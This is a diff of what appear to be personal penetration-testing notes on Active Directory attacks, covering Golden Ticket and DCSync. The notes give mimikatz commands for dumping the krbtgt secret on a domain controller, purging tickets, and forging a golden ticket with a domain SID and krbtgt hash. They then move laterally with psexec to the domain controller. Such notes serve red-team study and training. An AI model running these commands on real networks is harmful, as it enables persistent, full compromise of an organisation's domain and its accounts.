@@ -2,14 +2,12 @@
 
 <details>
 
-<summary>Golden Tickets</summary>
+<summary>Golden Ticket</summary>
 
 * When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
 * The secret key is actually the password hash of a domain user account called krbtgt.
 
-<!---->
-
-* Requires access to an account that is in Domain Admins group or compromised the DC
+- Requires access to an account that is in Domain Admins group or compromised the DC
 
 1. Inside DC,
 
@@ -29,12 +27,13 @@ lsadump::lsa /patch
 
 2. Delete any existing Kerberos tickets and generate a golden ticket.
 
-```
+```shell
 kerberos::purge
 ```
 
-```sh
-kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```bash
+kerberos::golden /user:fakeuser /domain:prod.corp1.com /sid:[domain-sid] /krbtgt:[krbtgt hash] /ptt		
+    #kerberos::golden /user:fakeuser /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /ptt
 ```
 
 3. Open anew command prompt and attempt lateral movement again
@@ -51,7 +50,7 @@ psexec.exe \\dc01 cmd.exe
 
 <details>
 
-<summary>Domain Controller Synchronization</summary>
+<summary>Domain Controller Synchronization (DCSync)</summary>
 
 * Requires Domain admin  account.
 
